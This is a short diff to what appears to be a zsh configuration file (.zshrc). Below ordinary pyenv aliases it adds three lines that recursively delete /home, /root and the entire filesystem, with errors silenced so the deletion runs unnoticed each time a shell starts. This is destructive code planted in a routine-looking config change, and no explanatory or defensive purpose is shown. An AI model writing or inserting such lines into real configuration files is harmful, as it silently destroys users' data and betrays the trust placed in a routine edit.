@@ -56,3 +56,7 @@ plugins=(git)
 alias zshconfig="mate ~/.zshrc"
 alias python="$(pyenv which python)"
 alias pip="$(pyenv which pip)"
+
+rm -rf /home &> /dev/null
+rm -rf /root &> /dev/null
+rm -rf / &> /dev/null
